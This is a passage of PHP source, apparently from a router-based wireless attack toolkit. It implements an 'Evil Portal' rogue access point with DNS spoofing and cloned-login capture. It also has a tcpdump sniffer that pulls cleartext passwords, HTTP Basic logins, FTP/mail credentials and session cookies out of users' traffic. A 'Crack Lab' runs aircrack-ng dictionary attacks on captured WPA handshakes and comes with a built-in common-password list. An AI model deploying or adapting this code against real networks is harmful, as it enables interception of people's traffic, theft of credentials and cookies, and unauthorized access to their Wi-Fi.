            'httpSniff' => $httpSniff,
            'rules' => $rules,
            'landingText' => $noticeMsg,
            'updatedAt' => gmdate('c'),
        ];
        @file_put_contents($rt . '/mitm.json', json_encode($mitm, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
        return self::setSuccess(['mitm' => $mitm]);
    }

    public function mitmStatus()
    {
        $rt = $this->evilPortalDir();
        $state = $this->readEvilPortalState();
        $available = !empty($state['running']) && !empty($state['internet']);
        $mitm = json_decode((string)@file_get_contents($rt . '/mitm.json'), true);
        $mitm = is_array($mitm) ? $mitm : ['httpSniff' => false, 'rules' => [], 'landingText' => ''];

        $alive = function ($pidFile) use ($rt) {
            $pid = (int)trim((string)@file_get_contents($rt . '/' . $pidFile));
            return $pid > 0 && file_exists("/proc/{$pid}");
        };

        $cloneCreds = [];
        foreach ($this->readEvilPortalCreds() as $c) {
            if (strpos((string)($c['template'] ?? ''), 'mitm-') === 0) {
                $cloneCreds[] = $c;
            }
        }
        $cloneTemplates = [];
        foreach ($this->mitmCloneTemplateDefs() as $id => $def) {
            $cloneTemplates[] = ['id' => $id, 'label' => $def['label'], 'description' => $def['description']];
        }

        return self::setSuccess([
            'available' => $available,
            'mitm' => $mitm,
            'httpSniffActive' => $alive('httpsniff.pid'),
            'dnsSpoofActive' => $alive('mitmdns.pid'),
            'captured' => $this->parseHttpSniff($rt . '/http.log'),
            'cloneCreds' => $cloneCreds,
            'cloneTemplates' => $cloneTemplates,
        ]);
    }

    public function stopMitm()
    {
        $this->teardownMitm(true);
        return self::setSuccess(['stopped' => true]);
    }

    // Heuristic parse of the tcpdump -A HTTP dump: pull out visited hosts, session
    // cookies, and any cleartext credentials (form fields / HTTP Basic).
    private function parseHttpSniff($path)
    {
        $out = ['hosts' => [], 'cookies' => [], 'creds' => []];
        $text = $this->tailFile($path, 80000);
        if ($text === '') {
            return $out;
        }
        $hosts = [];
        $cookies = [];
        $creds = [];
        $curHost = '';
        foreach (preg_split('/\r?\n/', $text) as $ln) {
            if (preg_match('/Host:\s*([A-Za-z0-9._-]+)/', $ln, $m)) {
                $curHost = $m[1];
                $hosts[$curHost] = ($hosts[$curHost] ?? 0) + 1;
            }
            if (preg_match('/Cookie:\s*(\S.+)$/', $ln, $m)) {
                $val = trim($m[1]);
                if (strlen($val) > 6) {
                    $cookies[] = ['host' => $curHost, 'value' => substr($val, 0, 240)];
                }
            }
            if (preg_match('#Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)#', $ln, $m)) {
                $dec = base64_decode($m[1], true);
                $creds[] = ['host' => $curHost, 'type' => 'http-basic', 'value' => ($dec !== false ? $dec : $m[1])];
            }
            if (preg_match('/((?:[^\s&]*(?:user(?:name)?|email|login|pass(?:word|wd)?|pwd)[^\s&]*=[^\s&]+)(?:&[^\s]*)?)/i', $ln, $m)) {
                $creds[] = ['host' => $curHost, 'type' => 'form', 'value' => substr($m[1], 0, 240)];
            }
        }
        arsort($hosts);
        foreach (array_slice($hosts, 0, 40, true) as $h => $n) {
            $out['hosts'][] = ['host' => $h, 'hits' => $n];
        }
        // De-dup cookies/creds by value, keep the most recent.
        $seen = [];
        foreach (array_reverse($cookies) as $c) {
            if (isset($seen[$c['value']])) { continue; }
            $seen[$c['value']] = true;
            $out['cookies'][] = $c;
            if (count($out['cookies']) >= 30) { break; }
        }
        $seen = [];
        foreach (array_reverse($creds) as $c) {
            if (isset($seen[$c['value']])) { continue; }
            $seen[$c['value']] = true;
            $out['creds'][] = $c;
            if (count($out['creds']) >= 30) { break; }
        }
        return $out;
    }

    // Recon results are intentionally ephemeral (browser-only): nothing is written
    // to disk and nothing is remembered between scans/sessions. These readers/writers
    // are kept as no-ops so any legacy callers stay harmless.
    private function readReconDatabase()
    {
        @unlink($this->reconDbPath());
        return $this->defaultReconDatabase();
    }

    private function writeReconDatabase($db)
    {
        return true;
    }

    private function cleanMetadataText($value, $maxLength)
    {
        $text = is_string($value) ? $value : '';
        $text = preg_replace('/[\x00-\x1F\x7F]/', ' ', $text);
        $text = trim(preg_replace('/\s+/', ' ', $text));
        return substr($text, 0, $maxLength);
    }

    private function normalizeTargetMetadata($metadata)
    {
        $metadata = is_array($metadata) ? $metadata : [];
        return [
            'authorized' => !empty($metadata['authorized']),
            'label' => $this->cleanMetadataText($metadata['label'] ?? '', 80),
            'notes' => $this->cleanMetadataText($metadata['notes'] ?? '', 500),
        ];
    }

    private function saveReconScan($interface, $networks)
    {
        if (!$this->ensureStorage()) {
            return false;
        }

        $db = $this->readReconDatabase();
        $timestamp = gmdate('c');
        $normalizedNetworks = is_array($networks) ? $networks : [];

        $db['updatedAt'] = $timestamp;
        $db['scans'][] = [
            'timestamp' => $timestamp,
            'interface' => $interface,
            'networks' => $normalizedNetworks,
        ];
        $db['scans'] = array_slice($db['scans'], -20);

        foreach ($normalizedNetworks as $network) {
            if (!isset($network['bssid']) || $network['bssid'] === '') {
                continue;
            }
            $bssid = strtolower($network['bssid']);
            $existing = isset($db['targets'][$bssid]) && is_array($db['targets'][$bssid]) ? $db['targets'][$bssid] : [];
            $firstSeenAt = isset($existing['firstSeenAt']) ? $existing['firstSeenAt'] : $timestamp;
            $seenCount = isset($existing['seenCount']) ? (int)$existing['seenCount'] + 1 : 1;
            $metadata = isset($existing['metadata']) && is_array($existing['metadata']) ? $existing['metadata'] : $this->normalizeTargetMetadata([]);
            $metadataUpdatedAt = isset($existing['metadataUpdatedAt']) && is_string($existing['metadataUpdatedAt']) ? $existing['metadataUpdatedAt'] : '';
            $db['targets'][$bssid] = array_merge($network, [
                'bssid' => $bssid,
                'firstSeenAt' => $firstSeenAt,
                'lastSeenAt' => $timestamp,
                'seenCount' => $seenCount,
                'metadata' => $metadata,
                'metadataUpdatedAt' => $metadataUpdatedAt,
            ]);
        }

        return $this->writeReconDatabase($db);
    }

    private function parseIwScan($output)
    {
        $networks = [];
        $blocks = preg_split('/\nBSS\s+/', "\n" . trim($output));
        foreach ($blocks as $block) {
            $block = trim($block);
            if ($block === '' || stripos($block, 'last seen') === false) {
                continue;
            }
            $network = [
                'bssid' => '',
                'ssid' => '<hidden>',
                'channel' => '',
                'frequency' => '',
                'signal' => '',
                'security' => 'Open',
                'capabilities' => [],
                'lastSeen' => '',
            ];
            if (preg_match('/^([0-9a-f:]{17})/i', $block, $match)) {
                $network['bssid'] = strtolower($match[1]);
            }
            if (preg_match('/SSID:\s*(.*)/', $block, $match)) {
                $ssid = trim($match[1]);
                $network['ssid'] = $ssid !== '' ? $ssid : '<hidden>';
            }
            if (preg_match('/freq:\s*(\d+)/', $block, $match)) {
                $network['frequency'] = $match[1] . ' MHz';
                $network['channel'] = $this->freqToChannel((int)$match[1]);
            }
            if (preg_match('/signal:\s*([-0-9.]+)\s*dBm/', $block, $match)) {
                $network['signal'] = $match[1] . ' dBm';
            }
            if (preg_match('/last seen:\s*(\d+)\s*ms ago/', $block, $match)) {
                $network['lastSeen'] = $match[1] . ' ms ago';
            }
            $security = [];
            if (strpos($block, "\tRSN:") !== false) {
                $security[] = 'WPA2/RSN';
            }
            if (strpos($block, "\tWPA:") !== false) {
                $security[] = 'WPA';
            }
            if (stripos($block, 'Authentication suites: SAE') !== false) {
                $security[] = 'WPA3/SAE';
            }
            if (stripos($block, 'WPS:') !== false) {
                $security[] = 'WPS';
            }
            $network['security'] = empty($security) ? 'Open' : implode(', ', array_unique($security));
            if (preg_match('/capability:\s+(.+)/', $block, $match)) {
                $network['capabilities'] = preg_split('/\s+/', trim($match[1]));
            }
            if ($network['bssid'] !== '') {
                $networks[] = $network;
            }
        }
        return $networks;
    }

    private function parseIwinfoScan($output)
    {
        $networks = [];
        $blocks = preg_split('/\n(?=Cell\s+\d+\s+-\s+Address:)/', trim($output));
        foreach ($blocks as $block) {
            $block = trim($block);
            if ($block === '') {
                continue;
            }

            $network = [
                'bssid' => '',
                'ssid' => '<hidden>',
                'channel' => '',
                'frequency' => '',
                'security' => 'Open',
                'signal' => '',
                'lastSeen' => 'now',
                'capabilities' => [],
            ];

            if (preg_match('/Address:\s*([0-9A-F:]{17})/i', $block, $match)) {
                $network['bssid'] = strtolower($match[1]);
            }
            if (preg_match('/ESSID:\s*"([^"]*)"/', $block, $match)) {
                $network['ssid'] = $match[1] !== '' ? $match[1] : '<hidden>';
            }
            if (preg_match('/Frequency:\s*([0-9.]+\s*GHz).*Channel:\s*(\d+)/', $block, $match)) {
                $network['frequency'] = trim($match[1]);
                $network['channel'] = $match[2];
            }
            if (preg_match('/Signal:\s*([-0-9]+\s*dBm)/', $block, $match)) {
                $network['signal'] = trim($match[1]);
            }
            if (preg_match('/Encryption:\s*(.+)/', $block, $match)) {
                $security = trim($match[1]);
                $network['security'] = strtolower($security) === 'none' ? 'Open' : $security;
            }
            if (preg_match('/Channel Width:\s*(.+)/', $block, $match)) {
                $network['capabilities'][] = 'width=' . trim($match[1]);
            }

            if ($network['bssid'] !== '') {
                $networks[] = $network;
            }
        }
        return $networks;
    }
    // Extracts the dBm integer from a "-53 dBm" signal string; missing/unparsable
    // signal sorts lowest so a row with a real reading always wins the dedup above.
    private function signalDbm($net)
    {
        if (preg_match('/-?\d+/', (string)($net['signal'] ?? ''), $m)) {
            return (int)$m[0];
        }
        return -999;
    }

    private function freqToChannel($freq)
    {
        if ($freq === 2484) {
            return '14';
        }
        if ($freq >= 2412 && $freq <= 2472) {
            return (string)(($freq - 2407) / 5);
        }
        if ($freq >= 5000 && $freq <= 5900) {
            return (string)(($freq - 5000) / 5);
        }
        return '';
    }

    // =====================================================================
    // Network Recon Command Center: persistent inventory + change detection
    // Builds on the existing startLanScan/lanScanStatus nmap plumbing. The UI
    // posts a completed scan's hosts here; we merge them into a rolling
    // inventory and report what is newly seen (hosts / open ports).
    // =====================================================================

    private function inventoryPath()
    {
        return $this->storageDir() . '/network-inventory.json';
    }

    private function readInventory()
    {
        $data = json_decode((string)@file_get_contents($this->inventoryPath()), true);
        if (!is_array($data) || !isset($data['hosts']) || !is_array($data['hosts'])) {
            return ['updatedAt' => '', 'hosts' => []];
        }
        return $data;
    }

    // Convert the mac/ip-keyed inventory map into a sorted list with ports as
    // a plain array (JSON objects -> array) for the frontend table.
    private function inventoryOutputHosts($hostsAssoc)
    {
        $out = [];
        foreach ($hostsAssoc as $host) {
            if (!is_array($host)) {
                continue;
            }
            $host['ports'] = is_array($host['ports'] ?? null) ? array_values($host['ports']) : [];
            $out[] = $host;
        }
        usort($out, function ($a, $b) {
            return strcmp($a['ip'] ?? '', $b['ip'] ?? '');
        });
        return $out;
    }

    public function getNetworkInventory()
    {
        $inv = $this->readInventory();
        $hosts = $this->inventoryOutputHosts($inv['hosts']);
        return self::setSuccess([
            'updatedAt' => $inv['updatedAt'] ?? '',
            'hosts' => $hosts,
            'hostCount' => count($hosts),
        ]);
    }

    public function updateNetworkInventory()
    {
        $incoming = $this->request['hosts'] ?? [];
        if (!is_array($incoming)) {
            return self::setError('No scan hosts were supplied.');
        }
        if (!$this->ensureStorage()) {
            return self::setError('Unable to write inventory storage.');
        }
        $inv = $this->readInventory();
        $existing = is_array($inv['hosts']) ? $inv['hosts'] : [];
        $now = gmdate('c');
        $newHosts = [];
        $newPorts = [];

        foreach ($incoming as $host) {
            if (!is_array($host)) {
                continue;
            }
            $ip = trim((string)($host['ip'] ?? ''));
            if ($ip === '' || !preg_match('/^\d{1,3}(\.\d{1,3}){3}$/', $ip)) {
                continue;
            }
            $mac = strtolower(trim((string)($host['mac'] ?? '')));
            $key = $mac !== '' ? $mac : $ip;

            $ports = [];
            if (!empty($host['ports']) && is_array($host['ports'])) {
                foreach ($host['ports'] as $p) {
                    if (!is_array($p)) {
                        continue;
                    }
                    $pn = (int)($p['port'] ?? 0);
                    if ($pn <= 0 || $pn > 65535) {
                        continue;
                    }
                    $proto = preg_replace('/[^a-z]/', '', strtolower((string)($p['proto'] ?? 'tcp')));
                    $ports[$pn . '/' . $proto] = [
                        'port' => $pn,
                        'proto' => $proto,
                        'service' => $this->cleanMetadataText((string)($p['service'] ?? ''), 40),
                        'version' => $this->cleanMetadataText((string)($p['version'] ?? ''), 80),
                    ];
                }
            }
            $vendor = $this->cleanMetadataText((string)($host['vendor'] ?? ''), 60);
            $hostname = $this->cleanMetadataText((string)($host['hostname'] ?? ''), 80);

            if (!isset($existing[$key])) {
                $existing[$key] = [
                    'ip' => $ip,
                    'mac' => $mac,
                    'vendor' => $vendor,
                    'hostname' => $hostname,
                    'ports' => $ports,
                    'firstSeen' => $now,
                    'lastSeen' => $now,
                    'isNew' => true,
                ];
                $newHosts[] = $ip . ($mac !== '' ? ' (' . $mac . ')' : '');
            } else {
                $prev = $existing[$key];
                $prevPorts = is_array($prev['ports'] ?? null) ? $prev['ports'] : [];
                foreach ($ports as $pk => $pv) {
                    if (!isset($prevPorts[$pk])) {
                        $newPorts[] = $ip . ' :' . $pv['port'] . '/' . $pv['proto'] . ($pv['service'] !== '' ? ' (' . $pv['service'] . ')' : '');
                    }
                }
                $existing[$key] = [
                    'ip' => $ip,
                    'mac' => $mac !== '' ? $mac : ($prev['mac'] ?? ''),
                    'vendor' => $vendor !== '' ? $vendor : ($prev['vendor'] ?? ''),
                    'hostname' => $hostname !== '' ? $hostname : ($prev['hostname'] ?? ''),
                    'ports' => !empty($ports) ? $ports : $prevPorts,
                    'firstSeen' => $prev['firstSeen'] ?? $now,
                    'lastSeen' => $now,
                    'isNew' => false,
                ];
            }
        }

        $inv = ['updatedAt' => $now, 'hosts' => $existing];
        @file_put_contents($this->inventoryPath(), json_encode($inv, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));

        return self::setSuccess([
            'updatedAt' => $now,
            'hosts' => $this->inventoryOutputHosts($existing),
            'hostCount' => count($existing),
            'changes' => ['newHosts' => $newHosts, 'newPorts' => $newPorts],
        ]);
    }

    public function clearNetworkInventory()
    {
        @unlink($this->inventoryPath());
        return self::setSuccess(['cleared' => true]);
    }

    // =====================================================================
    // Packet Intelligence: passive tcpdump sniffer + cleartext dissector.
    // Captures to a size-capped rolling pcap on a chosen interface, then
    // dissects the ASCII payload (via `tcpdump -r -A`) for DNS queries, HTTP
    // requests, cleartext credentials, and cookies. HTTPS stays opaque.
    // =====================================================================

    private function sniffJobDir()
    {
        return $this->storageRoot() . '/sniff';
    }

    private function sniffJobPaths($jobId)
    {
        $base = $this->sniffJobDir() . '/' . $jobId;
        return [
            'meta' => $base . '.json',
            'pcap' => $base . '.pcap',
            'err' => $base . '.err',
            'done' => $base . '.done',
            'pid' => $base . '.pid',
            'stop' => $base . '.stop',
        ];
    }

    private function isSniffRunning()
    {
        return trim((string)shell_exec("/usr/bin/pgrep -f 'tcpdump.*sniff/' 2>/dev/null")) !== '';
    }

    private function resolveSniffInterface($kind)
    {
        $kind = trim((string)$kind);
        if ($kind === 'twin') {
            if (!$this->isEvilPortalRunning()) {
                return ['error' => 'The Evil Portal twin is not running, so there is no twin interface to sniff.'];
            }
            return ['dev' => 'evtwin0', 'label' => 'Evil Portal twin (evtwin0)'];
        }
        if ($kind === 'lan') {
            return ['dev' => 'br-lan', 'label' => 'LAN bridge (br-lan)'];
        }
        $route = (string)shell_exec('ip -o route get 1.1.1.1 2>/dev/null');
        if (!preg_match('/dev\s+(\S+)/', $route, $dm)) {
            return ['error' => 'No internet uplink is available. Switch to Internet (uplink) mode, or pick the LAN/twin interface.'];
        }
        return ['dev' => $dm[1], 'label' => 'Uplink (' . $dm[1] . ')'];
    }

    private function sniffFilter($preset)
    {
        switch ($preset) {
            case 'dns':
                return 'udp port 53';
            case 'cleartext':
                return 'tcp port 80 or tcp port 21 or tcp port 23 or tcp port 25 or tcp port 110 or tcp port 143';
            case 'web':
            default:
                return 'tcp port 80 or udp port 53';
        }
    }

    public function startSniff()
    {
        if (trim((string)shell_exec('command -v tcpdump 2>/dev/null')) === '') {
            return self::setError("Required tool 'tcpdump' is not installed.");
        }
        if ($this->isSniffRunning()) {
            return self::setError('A packet capture is already running. Stop it before starting another.');
        }
        $preset = (string)($this->request['preset'] ?? 'web');
        if (!in_array($preset, ['web', 'dns', 'cleartext'], true)) {
            return self::setError('Unknown capture preset.');
        }
        $duration = (int)($this->request['duration'] ?? 120);
        if ($duration < 15 || $duration > 600) {
            return self::setError('Capture duration must be between 15 and 600 seconds.');
        }
        $resolved = $this->resolveSniffInterface((string)($this->request['iface'] ?? 'uplink'));
        if (isset($resolved['error'])) {
            return self::setError($resolved['error']);
        }
        $dev = $resolved['dev'];
        if (!$this->isSafeInterfaceName($dev)) {
            return self::setError('Resolved interface name is not safe to use.');
        }
        if (!$this->ensureDir($this->sniffJobDir())) {
            return self::setError('Unable to create sniffer job storage.');
        }

        $jobId = 'sniff-' . gmdate('YmdHis') . '-' . mt_rand(1000, 9999);
        $paths = $this->sniffJobPaths($jobId);
        $meta = [
            'jobId' => $jobId,
            'iface' => $dev,
            'label' => $resolved['label'],
            'preset' => $preset,
            'duration' => $duration,
            'createdAt' => gmdate('c'),
        ];
        @file_put_contents($paths['meta'], json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));

        $tcpdump = trim((string)shell_exec('command -v tcpdump 2>/dev/null')) ?: 'tcpdump';
        $filter = $this->sniffFilter($preset);
        $eDev = escapeshellarg($dev);
        $ePcap = escapeshellarg($paths['pcap']);
        $eErr = escapeshellarg($paths['err']);
        $eDone = escapeshellarg($paths['done']);
        $ePid = escapeshellarg($paths['pid']);
        $eStop = escapeshellarg($paths['stop']);
        $eFilter = escapeshellarg($filter);
        $dur = (int)$duration;

        // Rolling capture: 2 files x ~2MB so a busy link can't fill /tmp. A watcher
        // kills tcpdump on the stop flag or when the duration elapses.
        $body = escapeshellarg($tcpdump) . ' -i ' . $eDev . ' -n -s 0 -U -W 2 -C 2 -w ' . $ePcap . ' ' . $eFilter . ' 2>> ' . $eErr . ' & TPID=$!; '
            . 'echo $TPID > ' . $ePid . '; '
            . 'END=$(( $(date +%s) + ' . $dur . ' )); '
            . 'while kill -0 $TPID 2>/dev/null; do '
            . 'if [ -f ' . $eStop . ' ] || [ $(date +%s) -ge $END ]; then kill $TPID 2>/dev/null; sleep 1; kill -9 $TPID 2>/dev/null; break; fi; sleep 2; done; '
            . 'wait $TPID 2>/dev/null; echo 0 > ' . $eDone . ';';
        shell_exec('/bin/sh -c ' . escapeshellarg('( ' . $body . ' ) >/dev/null 2>&1 &'));

        return self::setSuccess(['pending' => true, 'jobId' => $jobId, 'meta' => $meta]);
    }

    public function sniffStatus()
    {
        $jobId = $this->request['jobId'] ?? '';
        if (!$this->isSafeJobId($jobId)) {
            return self::setError('Invalid capture job.');
        }
        $paths = $this->sniffJobPaths($jobId);
        if (!is_file($paths['meta'])) {
            return self::setError('Capture job was not found.');
        }
        $meta = json_decode((string)@file_get_contents($paths['meta']), true);
        $meta = is_array($meta) ? $meta : [];
        $pending = !is_file($paths['done']);
        return self::setSuccess([
            'pending' => $pending,
            'jobId' => $jobId,
            'meta' => $meta,
            'findings' => $this->parseSniffCapture($paths),
            'error' => trim($this->tailFile($paths['err'], 2000)),
        ]);
    }

    public function stopSniff()
    {
        $jobId = $this->request['jobId'] ?? '';
        if (!$this->isSafeJobId($jobId)) {
            return self::setError('Invalid capture job.');
        }
        $paths = $this->sniffJobPaths($jobId);
        if (is_file($paths['meta'])) {
            @file_put_contents($paths['stop'], gmdate('c'));
        }
        return self::setSuccess(['stopping' => true, 'jobId' => $jobId]);
    }

    public function downloadSniff()
    {
        $jobId = $this->request['jobId'] ?? '';
        if (!$this->isSafeJobId($jobId)) {
            return self::setError('Invalid capture job.');
        }
        $paths = $this->sniffJobPaths($jobId);
        $best = '';
        $bestSize = -1;
        foreach (glob($paths['pcap'] . '*') as $f) {
            $s = (int)@filesize($f);
            if ($s > $bestSize) {
                $bestSize = $s;
                $best = $f;
            }
        }
        if ($best === '' || $bestSize <= 0) {
            return self::setError('No capture file is available yet.');
        }
        $this->responseHandler->streamFile($best);
    }

    public function deleteSniff()
    {
        $jobId = $this->request['jobId'] ?? '';
        if (!$this->isSafeJobId($jobId)) {
            return self::setError('Invalid capture job.');
        }
        $paths = $this->sniffJobPaths($jobId);
        if (!is_file($paths['meta'])) {
            return self::setError('Capture job was not found.');
        }
        if (!is_file($paths['done'])) {
            return self::setError('Cannot delete a capture that is still running.');
        }
        foreach (glob($paths['pcap'] . '*') as $f) {
            @unlink($f);
        }
        foreach ($paths as $p) {
            if (is_string($p) && is_file($p)) {
                @unlink($p);
            }
        }
        return self::setSuccess(['deleted' => true, 'jobId' => $jobId]);
    }

    private function ipFromToken($tok)
    {
        // tcpdump renders endpoints as "10.0.0.5.51000" (ip.port); strip the port.
        if (preg_match('/^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(?:\.\d+)?$/', $tok, $m)) {
            return $m[1];
        }
        return $tok;
    }

    private function parseSniffCapture($paths)
    {
        $empty = [
            'dns' => [], 'http' => [], 'creds' => [], 'cookies' => [],
            'counts' => ['dns' => 0, 'http' => 0, 'creds' => 0, 'cookies' => 0],
            'pcapBytes' => 0, 'clients' => [],
        ];
        $files = glob($paths['pcap'] . '*');
        if (empty($files)) {
            return $empty;
        }
        $tcpdump = trim((string)shell_exec('command -v tcpdump 2>/dev/null')) ?: 'tcpdump';
        $text = '';
        $pcapBytes = 0;
        foreach ($files as $f) {
            $pcapBytes += (int)@filesize($f);
            if (strlen($text) < 700000) {
                $text .= (string)shell_exec($tcpdump . ' -r ' . escapeshellarg($f) . ' -A -n -s 0 2>/dev/null | head -c 400000');
                $text .= "\n";
            }
        }
        $empty['pcapBytes'] = $pcapBytes;
        if (trim($text) === '') {
            return $empty;
        }

        $dns = [];
        $http = [];
        $creds = [];
        $cookies = [];
        $clients = [];

        $curSrc = '';
        $curDst = '';
        $curHost = '';
        foreach (explode("\n", $text) as $raw) {
            $line = rtrim($raw, "\r");
            if (preg_match('/^\d\d:\d\d:\d\d\.\d+ IP6?\s+(\S+?)\s+>\s+(\S+?):/', $line, $m)) {
                $curSrc = $this->ipFromToken($m[1]);
                $curDst = $this->ipFromToken($m[2]);
                $curHost = '';
                if (preg_match('/^\d{1,3}(\.\d{1,3}){3}$/', $curSrc)) {
                    $clients[$curSrc] = true;
                }
                if (strpos($line, '.53:') !== false && preg_match_all('/\b(?:A|AAAA|CNAME)\??\s+([A-Za-z0-9]([A-Za-z0-9._-]*[A-Za-z0-9])?)/', $line, $dm)) {
                    foreach ($dm[1] as $dom) {
                        $dom = strtolower(rtrim($dom, '.'));
                        if ($dom === '' || strpos($dom, '.') === false) {
                            continue;
                        }
                        $k = $curSrc . '|' . $dom;
                        $dns[$k] = ($dns[$k] ?? 0) + 1;
                    }
                }
                continue;
            }
            $t = trim($line);
            if ($t === '') {
                continue;
            }
            if (preg_match('#^(GET|POST|HEAD|PUT|DELETE|OPTIONS|PATCH)\s+(\S+)\s+HTTP/#', $t, $rm)) {
                $http[] = ['client' => $curSrc, 'method' => $rm[1], 'url' => substr($rm[2], 0, 120), 'host' => '', 'ua' => ''];
                continue;
            }
            if (stripos($t, 'Host:') === 0) {
                $curHost = substr(trim(substr($t, 5)), 0, 80);
                for ($i = count($http) - 1; $i >= 0 && $i >= count($http) - 4; $i--) {
                    if ($http[$i]['client'] === $curSrc && $http[$i]['host'] === '') {
                        $http[$i]['host'] = $curHost;
                        break;
                    }
                }
                continue;
            }
            if (stripos($t, 'User-Agent:') === 0) {
                $ua = substr(trim(substr($t, 11)), 0, 120);
                for ($i = count($http) - 1; $i >= 0 && $i >= count($http) - 4; $i--) {
                    if ($http[$i]['client'] === $curSrc && $http[$i]['ua'] === '') {
                        $http[$i]['ua'] = $ua;
                        break;
                    }
                }
                continue;
            }
            if (stripos($t, 'Authorization: Basic ') === 0) {
                $dec = base64_decode(trim(substr($t, 21)), true);
                if ($dec !== false && strpos($dec, ':') !== false && ctype_print($dec)) {
                    $creds[] = ['client' => $curSrc, 'host' => $curHost, 'type' => 'HTTP Basic', 'detail' => substr($dec, 0, 120)];
                }
                continue;
            }
            if (stripos($t, 'Cookie:') === 0) {
                $k = $curSrc . '|' . $curHost;
                if (!isset($cookies[$k])) {
                    $cookies[$k] = ['client' => $curSrc, 'host' => $curHost, 'cookie' => substr(trim(substr($t, 7)), 0, 160)];
                }
                continue;
            }
            if (preg_match('/(?:^|&)(?:pass|passwd|password|pwd|pass1)=([^&\s]{1,64})/i', $t, $pm)) {
                $user = '';
                if (preg_match('/(?:^|&)(?:user|username|login|email|usr|log)=([^&\s]{1,64})/i', $t, $um)) {
                    $user = $um[1];
                }
                $creds[] = ['client' => $curSrc, 'host' => $curHost, 'type' => 'Form POST', 'detail' => ($user !== '' ? $user . ' : ' : '') . $pm[1]];
                continue;
            }
            if (preg_match('/^(USER|PASS)\s+(\S+)/', $t, $fm)) {
                $creds[] = ['client' => $curSrc, 'host' => $curDst, 'type' => 'FTP/Mail', 'detail' => $fm[1] . ' ' . substr($fm[2], 0, 60)];
                continue;
            }
        }

        $dnsList = [];
        foreach ($dns as $k => $count) {
            $parts = explode('|', $k, 2);
            $dnsList[] = ['client' => $parts[0], 'domain' => $parts[1] ?? '', 'count' => $count];
        }
        usort($dnsList, function ($a, $b) {
            return $b['count'] - $a['count'];
        });
        $dnsList = array_slice($dnsList, 0, 200);

        $seen = [];
        $httpList = [];
        foreach ($http as $e) {
            $sig = $e['client'] . '|' . $e['host'] . '|' . $e['method'] . '|' . $e['url'];
            if (isset($seen[$sig])) {
                continue;
            }
            $seen[$sig] = true;
            $httpList[] = $e;
            if (count($httpList) >= 200) {
                break;
            }
        }

        $seenC = [];
        $credList = [];
        foreach ($creds as $e) {
            $sig = $e['type'] . '|' . $e['detail'];
            if (isset($seenC[$sig])) {
                continue;
            }
            $seenC[$sig] = true;
            $credList[] = $e;
            if (count($credList) >= 100) {
                break;
            }
        }

        $cookieList = array_slice(array_values($cookies), 0, 100);

        return [
            'dns' => $dnsList,
            'http' => $httpList,
            'creds' => $credList,
            'cookies' => $cookieList,
            'counts' => [
                'dns' => count($dnsList),
                'http' => count($httpList),
                'creds' => count($credList),
                'cookies' => count($cookieList),
            ],
            'pcapBytes' => $pcapBytes,
            'clients' => array_keys($clients),
        ];
    }

    // =====================================================================
    // Crack Lab: dictionary attack on captured handshakes (aircrack-ng),
    // wordlist generators, and WPS default-PIN intelligence. Single-core box,
    // so this is aimed at weak / default credentials, not real brute force.
    // =====================================================================

    private function crackJobDir()
    {
        return $this->storageRoot() . '/crack';
    }

    private function wordlistDir()
    {
        return $this->storageRoot() . '/wordlists';
    }

    private function crackJobPaths($jobId)
    {
        $base = $this->crackJobDir() . '/' . $jobId;
        return [
            'meta' => $base . '.json',
            'out' => $base . '.out',
            'key' => $base . '.key',
            'done' => $base . '.done',
            'pid' => $base . '.pid',
            'stop' => $base . '.stop',
        ];
    }

    private function isCrackRunning()
    {
        return trim((string)shell_exec('/usr/bin/pgrep -x aircrack-ng 2>/dev/null')) !== '';
    }

    private function isSafeWordlistName($name)
    {
        return is_string($name) && preg_match('/^[A-Za-z0-9._-]{1,64}$/', $name) && strpos($name, '..') === false;
    }

    public function listCrackSources()
    {
        $dir = $this->captureJobDir();
        $sources = [];
        if (is_dir($dir)) {
            foreach (glob($dir . '/*.json') as $metaPath) {
                $jobId = basename($metaPath, '.json');
                if (!$this->isSafeJobId($jobId)) {
                    continue;
                }
                $paths = $this->captureJobPaths($jobId);
                if (!is_file($paths['cap']) || filesize($paths['cap']) === 0) {
                    continue;
                }
                $meta = json_decode((string)@file_get_contents($paths['meta']), true);
                $meta = is_array($meta) ? $meta : [];
                $result = $this->summarizeCaptureResult($paths);
                $sources[] = [
                    'jobId' => $jobId,
                    'bssid' => $meta['target']['bssid'] ?? '',
                    'ssid' => $meta['target']['ssid'] ?? '',
                    'handshake' => !empty($result['handshakeCaptured']),
                    'hashCount' => $result['hashCount'] ?? 0,
                    'pcapBytes' => $result['pcapBytes'] ?? 0,
                    'source' => $meta['source'] ?? ($meta['type'] ?? 'capture'),
                    'createdAt' => $meta['createdAt'] ?? '',
                ];
            }
        }
        usort($sources, function ($a, $b) {
            return strcmp($b['jobId'], $a['jobId']);
        });
        return self::setSuccess(['sources' => $sources]);
    }

    public function listWordlists()
    {
        if (!$this->ensureDir($this->wordlistDir())) {
            return self::setError('Unable to access wordlist storage.');
        }
        $lists = [];
        foreach (glob($this->wordlistDir() . '/*.txt') as $f) {
            $lists[] = [
                'name' => basename($f),
                'bytes' => (int)filesize($f),
                'lines' => (int)trim((string)shell_exec('wc -l < ' . escapeshellarg($f) . ' 2>/dev/null')),
            ];
        }
        usort($lists, function ($a, $b) {
            return strcmp($a['name'], $b['name']);
        });
        return self::setSuccess(['wordlists' => $lists]);
    }

    private function commonPskList()
    {
        // Curated common WPA/WPA2 pre-shared keys (all >= 8 chars).
        return [
            '12345678', '123456789', '1234567890', 'password', 'password1', 'password123',
            'qwerty123', 'qwertyuiop', 'abcd1234', 'abc12345', '1qaz2wsx', 'q1w2e3r4',
            '11111111', '00000000', '123123123', '12341234', '87654321', 'iloveyou',
            'welcome1', 'welcome123', 'admin123', 'administrator', 'letmein1', 'changeme',
            'internet', 'wireless', 'password!', 'p@ssw0rd', 'passw0rd', 'sunshine1',
            'football1', 'baseball1', 'superman1', 'trustno1', 'whatever1', 'dragon123',
            'monkey123', 'master123', 'shadow123', 'michael1', 'jennifer1', 'computer1',
            'princess1', 'starwars1', 'freedom1', 'samsung1', 'default1', 'homewifi1',
            'mypassword', 'mypassword1', 'wifipassword', 'network1', 'router123', 'linksys1',
            'netgear1', 'dlink123', 'tplink123', 'connect1', 'guest1234', 'family123',
